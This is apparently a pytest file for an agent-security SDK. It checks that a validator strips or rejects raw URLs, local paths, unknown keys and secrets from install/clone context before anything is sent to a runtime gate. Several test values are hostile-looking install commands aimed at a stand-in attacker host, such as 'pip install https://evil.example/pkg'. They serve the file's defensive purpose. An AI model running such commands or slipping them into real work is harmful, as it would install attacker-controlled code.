"""Client-side bounding for Runtime Gate install_clone_context."""

from __future__ import annotations

import json
from copy import deepcopy
from pathlib import Path
from unittest.mock import MagicMock, patch

import httpx
import pytest
from nacl.signing import SigningKey

from agentveil.agent import AVPAgent, _public_key_to_did
from agentveil.exceptions import AVPValidationError
from agentveil.runtime_install_clone import (
    validate_install_clone_context,
    validate_metadata_evidence_slot,
)

AGENT_SEED = bytes.fromhex("44" * 32)
VALID_HASH = "sha256:" + ("ab" * 32)
_CONTRACT_PATH = (
    Path(__file__).resolve().parent / "fixtures" / "runtime_gate_public_wire_contract.json"
)
_FORBIDDEN_PRIVATE_MARKERS = (
    "source_truth",
    "entitlement",
    "billing",
    "hosted_accounting",
    "kms",
    "s3",
    "team_context",
    "enterprise",
    "customer",
    "license_id",
    "workspace_id",
    "database",
    "db_",
    "resolver",
    "threshold",
)


def _public_wire_contract() -> dict:
    return json.loads(_CONTRACT_PATH.read_text(encoding="utf-8"))


def _bounded_context(**overrides):
    payload = {
        "operation": "install",
        "source_ref": "src_package_route_builtin",
        "source_ref_kind": "workspace_registry",
        "user_pinned_source": False,
        "intent_source": "user_direct",
        "target_source": "workspace_registry",
        "tool_source": "approved_registry",
        "metadata_influence": "none",
        "requested_package": "pkg_package_route_builtin",
        "expected_package": "pkg_package_route_builtin",
    }
    payload.update(overrides)
    return payload


def test_validate_install_clone_context_accepts_bounded_payload():
    bounded = validate_install_clone_context(_bounded_context())
    assert bounded["source_ref"] == "src_package_route_builtin"
    assert "artifact_id" not in bounded


def test_validate_install_clone_context_accepts_bounded_metadata_evidence():
    bounded = validate_install_clone_context(
        _bounded_context(
            readme={
                "signal_code": "install_hint",
                "evidence_ref": "ev_readme_001",
                "content_hash": VALID_HASH,
            },
            tool_output={"signal_code": "package_reference"},
            mcp_schema={
                "signal_code": "tool_declares_install",
                "evidence_ref": "ev_mcp_schema_package_route",
            },
            file_metadata={"signal_code": "config_package_ref"},
        )
    )
    assert bounded["readme"]["signal_code"] == "install_hint"
    assert bounded["tool_output"]["signal_code"] == "package_reference"
    assert bounded["mcp_schema"]["evidence_ref"] == "ev_mcp_schema_package_route"
    assert bounded["file_metadata"]["signal_code"] == "config_package_ref"
    text = json.dumps(bounded, sort_keys=True)
    assert "raw_readme" not in text
    assert "https://" not in text


def test_validate_install_clone_context_rejects_extra_keys():
    with pytest.raises(AVPValidationError, match="forbidden keys"):
        validate_install_clone_context(_bounded_context(artifact_id="art_x"))


def test_validate_install_clone_context_rejects_unknown_evidence_slot_fields():
    with pytest.raises(AVPValidationError, match="forbidden keys"):
        validate_install_clone_context(
            _bounded_context(
                readme={
                    "signal_code": "install_hint",
                    "raw_readme": "pip install evil",
                }
            )
        )


def test_validate_install_clone_context_rejects_wrong_channel_signal_code():
    with pytest.raises(AVPValidationError, match="signal_code"):
        validate_install_clone_context(
            _bounded_context(readme={"signal_code": "package_reference"})
        )


def test_validate_install_clone_context_rejects_raw_url_in_content_hash():
    with pytest.raises(AVPValidationError):
        validate_install_clone_context(
            _bounded_context(
                readme={
                    "signal_code": "install_hint",
                    "content_hash": "https://evil.example/readme.md",
                }
            )
        )


def test_validate_metadata_evidence_slot_rejects_without_echoing_raw_input():
    with pytest.raises(AVPValidationError) as exc_info:
        validate_metadata_evidence_slot(
            "readme",
            {
                "signal_code": "install_hint",
                "content_hash": "https://evil.example/secret-readme",
            },
        )
    assert "evil.example" not in str(exc_info.value)
    assert "secret-readme" not in str(exc_info.value)


@pytest.mark.parametrize(
    "overrides",
    [
        {"source_ref": "https://evil.example/pkg.whl"},
        {"source_ref": "/Users/secret/proj"},
        {"requested_package": "raw-secret-package-name"},
        {"intent_source": "not_a_real_intent"},
        {"operation": "download"},
        {"readme_signal": {"signal_code": "install_hint"}},
    ],
)
def test_validate_install_clone_context_rejects_raw_or_invalid(overrides):
    with pytest.raises(AVPValidationError):
        validate_install_clone_context(_bounded_context(**overrides))


def test_validate_install_clone_context_does_not_echo_unknown_key():
    marker = "sk_live_should_not_echo"
    with pytest.raises(AVPValidationError) as exc_info:
        validate_install_clone_context(_bounded_context(**{marker: "x"}))
    assert marker not in str(exc_info.value)


def test_avp_agent_runtime_evaluate_rejects_mcp_proxy_environment_before_http():
    agent = AVPAgent("https://agentveil.dev", AGENT_SEED, name="env-reject", timeout=2.0)
    posted = {"called": False}

    def mock_post(*_args, **_kwargs):
        posted["called"] = True
        raise AssertionError("HTTP post must not run for invalid environment")

    with patch.object(httpx.Client, "post", side_effect=mock_post):
        with pytest.raises(AVPValidationError, match="environment invalid") as exc_info:
            agent.runtime_evaluate(
                action="package.pip_install",
                resource="redacted",
                environment="mcp_proxy",
                delegation_receipt={"id": "grant"},
                payload_hash="sha256:" + ("a" * 64),
                risk_class="write",
                policy_context_hash="sha256:" + ("b" * 64),
            )
    assert posted["called"] is False
    assert "mcp_proxy" not in str(exc_info.value)


@pytest.mark.parametrize(
    "environment",
    _public_wire_contract()["request"]["environment"]["allowed_values"],
)
def test_avp_agent_runtime_evaluate_accepts_canonical_environments(environment):
    agent = AVPAgent("https://agentveil.dev", AGENT_SEED, name="env-accept", timeout=2.0)
    captured: dict[str, object] = {}

    def mock_post(_url, **kwargs):
        body = json.loads(kwargs["content"])
        captured["body"] = body
        response = MagicMock(spec=httpx.Response)
        response.status_code = 200
        response.json.return_value = {"decision": "ALLOW", "audit_id": "urn:uuid:x"}
        return response

    with patch.object(httpx.Client, "post", side_effect=mock_post):
        agent.runtime_evaluate(
            action="github.read_file",
            resource="repo_ref_001",
            environment=environment,
            delegation_receipt={"id": "grant"},
        )

    assert captured["body"]["environment"] == environment


def test_avp_agent_runtime_evaluate_rejects_raw_context_before_http_post():
    agent = AVPAgent("https://agentveil.dev", AGENT_SEED, name="privacy-probe", timeout=2.0)
    posted = {"called": False}

    def mock_post(*_args, **_kwargs):
        posted["called"] = True
        raise AssertionError("HTTP post must not run for invalid install_clone_context")

    with patch.object(httpx.Client, "post", side_effect=mock_post):
        with pytest.raises(AVPValidationError):
            agent.runtime_evaluate(
                action="package.pip_install",
                resource="redacted",
                environment="unknown",
                delegation_receipt={"id": "grant"},
                payload_hash="sha256:" + ("a" * 64),
                risk_class="write",
                policy_context_hash="sha256:" + ("b" * 64),
                install_clone_context=_bounded_context(
                    source_ref="https://evil.example/pkg.whl",
                    requested_package="/Users/secret/proj",
                ),
            )
    assert posted["called"] is False


def test_avp_agent_runtime_evaluate_posts_only_bounded_context():
    agent = AVPAgent("https://agentveil.dev", AGENT_SEED, name="bounded-probe", timeout=2.0)
    captured: dict[str, object] = {}
    contract = _public_wire_contract()
    top_level = contract["request"]["top_level_fields"]
    allowed_top_level = set(top_level["required"]) | set(top_level["optional"])
    slots = contract["request"]["install_clone_context"]["metadata_evidence_slots"]
    allowed_slots = set(slots["allowed_slot_names"])
    allowed_slot_keys = set(slots["allowed_payload_keys"])
    context_fields = contract["request"]["install_clone_context"]
    allowed_context_keys = set(context_fields["required"]) | set(context_fields["optional"])

    def mock_post(url, **kwargs):
        body = json.loads(kwargs["content"])
        captured["url"] = url
        captured["body"] = body
        response = MagicMock(spec=httpx.Response)
        response.status_code = 200
        response.json.return_value = {"decision": "ALLOW", "audit_id": "urn:uuid:x"}
        return response

    with patch.object(httpx.Client, "post", side_effect=mock_post):
        agent.runtime_evaluate(
            action="package.pip_install",
            resource="redacted",
            environment="unknown",
            delegation_receipt={"id": "grant"},
            payload_hash="sha256:" + ("a" * 64),
            risk_class="write",
            policy_context_hash="sha256:" + ("b" * 64),
            install_clone_context=_bounded_context(
                mcp_schema={
                    "signal_code": "tool_declares_install",
                    "evidence_ref": "ev_mcp_schema_package_route",
                },
                readme={
                    "signal_code": "install_hint",
                    "evidence_ref": "ev_readme_001",
                    "content_hash": VALID_HASH,
                },
            ),
        )

    body = captured["body"]
    assert captured["url"] == "/v1/runtime/evaluate"
    assert body["environment"] == "unknown"
    assert set(body) <= allowed_top_level
    context = body["install_clone_context"]
    assert set(context) <= allowed_context_keys
    for slot_name, slot in context.items():
        if slot_name not in allowed_slots:
            continue
        assert set(slot) <= allowed_slot_keys
    assert context["source_ref"] == "src_package_route_builtin"
    assert context["mcp_schema"]["signal_code"] == "tool_declares_install"
    assert context["readme"]["signal_code"] == "install_hint"
    body_text = json.dumps(body, sort_keys=True)
    assert "https://" not in body_text
    assert "/Users/" not in body_text
    assert "pip install" not in body_text
    assert "raw-secret-package-name" not in body_text
    assert _public_key_to_did(bytes(SigningKey(AGENT_SEED).verify_key)) == body["agent_did"]


def test_public_wire_contract_fixture_is_public_safe():
    data = _public_wire_contract()
    assert data["schema_version"] == "avp.runtime_gate.public_wire_contract.v1"
    # claim-check: allow production is a finite public wire enum value.
    assert data["request"]["environment"]["allowed_values"] == [
        "production",  # claim-check: allow canonical transport enum, not a readiness claim.
        "staging",
        "development",
        "unknown",
    ]
    assert data["request"]["environment"]["default_client_value"] == "unknown"
    slots = data["request"]["install_clone_context"]["metadata_evidence_slots"]
    assert slots["allowed_slot_names"] == [
        "readme",
        "tool_output",
        "mcp_schema",
        "file_metadata",
    ]
    assert set(slots["allowed_payload_keys"]) == {
        "signal_code",
        "evidence_ref",
        "content_hash",
    }
    serialized = json.dumps(data, sort_keys=True)
    for marker in _FORBIDDEN_PRIVATE_MARKERS:
        assert marker not in serialized


def test_avp_agent_runtime_evaluate_rejects_unknown_metadata_slot_before_http():
    agent = AVPAgent("https://agentveil.dev", AGENT_SEED, name="slot-probe", timeout=2.0)
    posted = {"called": False}

    def mock_post(*_args, **_kwargs):
        posted["called"] = True
        raise AssertionError("HTTP post must not run for unknown metadata slot")

    with patch.object(httpx.Client, "post", side_effect=mock_post):
        with pytest.raises(AVPValidationError, match="forbidden keys"):
            agent.runtime_evaluate(
                action="package.pip_install",
                resource="redacted",
                environment="unknown",
                delegation_receipt={"id": "grant"},
                payload_hash="sha256:" + ("a" * 64),
                risk_class="write",
                policy_context_hash="sha256:" + ("b" * 64),
                install_clone_context=_bounded_context(
                    raw_readme={"signal_code": "install_hint"},
                ),
            )
    assert posted["called"] is False


def test_avp_agent_runtime_evaluate_rejects_unknown_slot_key_before_http():
    agent = AVPAgent("https://agentveil.dev", AGENT_SEED, name="slot-key-probe", timeout=2.0)
    posted = {"called": False}

    def mock_post(*_args, **_kwargs):
        posted["called"] = True
        raise AssertionError("HTTP post must not run for unknown slot payload key")

    with patch.object(httpx.Client, "post", side_effect=mock_post):
        with pytest.raises(AVPValidationError, match="forbidden keys"):
            agent.runtime_evaluate(
                action="package.pip_install",
                resource="redacted",
                environment="unknown",
                delegation_receipt={"id": "grant"},
                payload_hash="sha256:" + ("a" * 64),
                risk_class="write",
                policy_context_hash="sha256:" + ("b" * 64),
                install_clone_context=_bounded_context(
                    readme={
                        "signal_code": "install_hint",
                        "raw_text": "pip install https://evil.example/pkg",
                    }
                ),
            )
    assert posted["called"] is False


def test_contract_package_install_fixture_uses_only_allowed_evidence_slots():
    fixture = deepcopy(_public_wire_contract()["valid_request_fixtures"][1]["body"])
    context = fixture["install_clone_context"]
    slots = _public_wire_contract()["request"]["install_clone_context"][
        "metadata_evidence_slots"
    ]
    allowed_slots = set(slots["allowed_slot_names"])
    allowed_keys = set(slots["allowed_payload_keys"])
    for name in allowed_slots:
        assert name in context
        assert set(context[name]) <= allowed_keys
    bounded = validate_install_clone_context(context)
    assert set(bounded).issuperset(slots["allowed_slot_names"])
